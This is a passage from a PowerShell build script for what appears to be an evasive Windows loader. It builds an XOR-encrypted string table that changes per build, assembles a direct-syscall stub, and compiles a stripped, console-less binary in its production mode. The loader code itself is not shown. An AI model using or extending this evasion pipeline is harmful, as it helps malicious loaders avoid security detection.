...
# Step 4b: Generate EVS string header (per-build random XOR key)
Write-Host "[*] Generating EVS string table..." -ForegroundColor White
$evsResult = python modules\gen_evs.py modules\strings.txt -o modules\evs_strings.h 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] EVS generation failed: $evsResult" -ForegroundColor Red
    exit 1
}
Write-Host "[+] $evsResult" -ForegroundColor Green

# Step 4c: Assemble dosyscall.S
Write-Host "[*] Assembling dosyscall.S..." -ForegroundColor White
$asmResult = x86_64-w64-mingw32-gcc -c modules\dosyscall.S -o modules\dosyscall.o 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] Assembly failed: $asmResult" -ForegroundColor Red
    exit 1
}
Write-Host "[+] dosyscall.S assembled" -ForegroundColor Green

# Step 5: Compile
if ($IsDebug) {
    Write-Host "[*] Compiling loader (DEBUG MODE)..." -ForegroundColor Yellow
    $compileCmd = "gcc -O0 -g -DDEBUG -Imodules loader_v3.c modules\*.c modules\dosyscall.o -o output\$OutputName -ladvapi32 -lntdll -luser32"
} else {
    Write-Host "[*] Compiling loader (PRODUCTION MODE)..." -ForegroundColor White
    $compileCmd = "gcc -O2 -DPRODUCTION -Imodules loader_v3.c modules\*.c modules\dosyscall.o -o output\$OutputName -ladvapi32 -lntdll -luser32 -mwindows -s"
}
Write-Host ""
